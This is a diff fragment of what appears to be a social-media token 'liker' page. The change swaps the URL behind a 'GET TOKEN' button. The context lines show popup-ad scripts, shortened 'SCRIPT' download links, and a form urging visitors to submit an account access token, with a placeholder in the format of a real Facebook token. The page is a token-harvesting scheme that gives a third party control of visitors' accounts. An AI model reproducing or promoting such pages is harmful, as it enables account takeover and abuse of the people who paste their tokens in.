@@ -205,7 +205,7 @@ echo'
 </a><center><a><img src="http://alo0osh-sy.xtgem.com/images/Rock.gif" alt="Rock"></a><center><a>
 <center><a><p style="font-size:20;color:yellow">Get Working Token Here</p><center>
 </center>
-<script type="text/javascript" src="http://wap4dollar.com/ad/pops/?id=cx5av5xnzc"></script><center><a href="https://BOTTERSKING.COM/token/" target="_blank"><input class="button button5" type="button" value="♥ GET TOKEN ♥"> </a><a href="http://zipansion.com/24fhq" target="_blank"><input class="button button5" type="button" value="♥ SCRIPT ♥"> </a></center><center>
+<script type="text/javascript" src="http://wap4dollar.com/ad/pops/?id=cx5av5xnzc"></script><center><a href="http://ayesh.byethost7.com/" target="_blank"><input class="button button5" type="button" value="♥ GET TOKEN ♥"> </a><a href="http://zipansion.com/24fhq" target="_blank"><input class="button button5" type="button" value="♥ SCRIPT ♥"> </a></center><center>
 <h4><font size="15" color="red"><center>••´º´•» </font><font face="Orbitron" size="6" style="background: url(&quot;http://img1.liveinternet.ru/images/attach/c/3/77/307/77307665_MontiBlingStar77.gif&quot;) repeat scroll 0% 0% transparent; color:#fff; text-shadow: 0pt 0pt 0.6em red, 0pt 2pt 0.6em red;"><b>Submit Your Token Here !!</b></font><font size="15" color="red"> «•´º´••</center></font></h4> 
 <center>
 <script type="text/javascript" src="http://wap4dollar.com/ad/pops/?id=cx5av5xnzc"></script><center><form action=""method="POST"><input class="input" type="text"name="access_token" placeholder="EAAAAAYsX7TsBAG62KddDOXEZAsB428Ypqgv6o2pKoZANTa6hEIqIFcEAsfvQSlefXqDbUDbiUCxtmOaeo6jKgO0RAieCOz2dMnJp7Jk9F499Sl53tAXR44Pkt"
